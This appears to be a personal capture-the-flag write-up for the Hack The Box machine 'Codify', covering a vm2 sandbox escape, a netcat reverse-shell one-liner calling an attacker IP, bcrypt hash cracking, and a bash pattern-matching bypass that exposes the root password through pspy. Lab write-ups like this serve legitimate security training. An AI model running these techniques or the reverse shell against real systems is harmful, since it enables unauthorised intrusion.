Main steps
1. Enumerate the website to find a vulnerable library
2. Locate public exploit for this library and gain a reverse shell
3. Enumerate /var/www/* for hashed credentials
4. Dictionary attack on password hash to gain user access
5. Enumerate sudo -l to find a script that can be run as root
6. Enumerate said script to find vulnerability in conditional statement
7. Use a process snooper to dump the script's commands
8. Gain root access using the password found using the snooper

Learning points
1. Try all the reverse shell commands as some may not work
2. Enumerate shell scripts properly as they may have vulnerabilities based on how they were written - (refer to https://mywiki.wooledge.org/BashPitfalls)
3. Use tools like pspy to view secrets passed to command line from scripts/ cronjobs

nmap
![[Pasted image 20260303211839.png]]
ports 22, 80, 3000 (node.js express framework) open
Added codify.htb to /etc/hosts
![[Pasted image 20260303220917.png]]
Shows a website with a Node.js code editor
Navigating to About us shows that the code editor uses the vm2 library for sandboxing, release 3.9.16
![[Pasted image 20260303221006.png]]
Googling this version shows a sandbox exploit for this version at https://www.exploit-db.com/exploits/51898
Pasted the code into the editor and got results for 'pwd'
![[Pasted image 20260303221120.png]]
Tried to launch a reverse shell using bash but got an error
![[Pasted image 20260303221227.png]]
cat /etc/passwd shows a second user named 'joshua'
![[Pasted image 20260303221504.png]]

Was able to spawn a reverse shell using 
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.59 4444 >/tmp/f`
![[Pasted image 20260303222725.png]]
Ran linpeas, nothing major flagged
Checking the /var/www shows a folder named contact with a tickets.db file. Opening this using sqlite3 shows possible user credentials for Joshua.
![[Pasted image 20260303224034.png]]
`3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2`
Hashed password? > bcrypt passwords start with `$2a$`

Ran hashcat -m 3200 for this hash and got 'spongebob1'
![[Pasted image 20260303224631.png]]
![[Pasted image 20260303224624.png]]

Able to get SSH access to 'joshua' using 'spongebob1' and retrieved the user flag
![[Pasted image 20260303224705.png]]

Checked sudo -l, found a script that can be run as sudo
![[Pasted image 20260304002038.png]]
![[Pasted image 20260304002050.png]]

`if [[ $DB_PASS == $USER_PASS ]]; then
the line of shell script above is vulnerable (see this page: https://mywiki.wooledge.org/BashPitfalls#if_.5B.5B_.24foo_.3D_.24bar_.5D.5D_.28depending_on_intent.29) as bash does pattern matching on $USER_PASS rather than treating it as a string. With this vulnerability, it is possible to bypass this conditional by passing a '`*`' to the input.

From this, the script can then be run. Since it executes commands using the 'root' database user's password directly to command line, we can use a process snooper like pspy (https://github.com/DominicBreuker/pspy) here to view the commands that the script ran.
`
![[Pasted image 20260304011429.png]]
![[Pasted image 20260304010944.png]]

The password for 'root' is shown here in the pspy output as 'kljh12k3jhaskjh12kjh3'. (the -p is the argument flag so remove)

Able to su to the root user and get the root flag.
![[Pasted image 20260304011753.png]]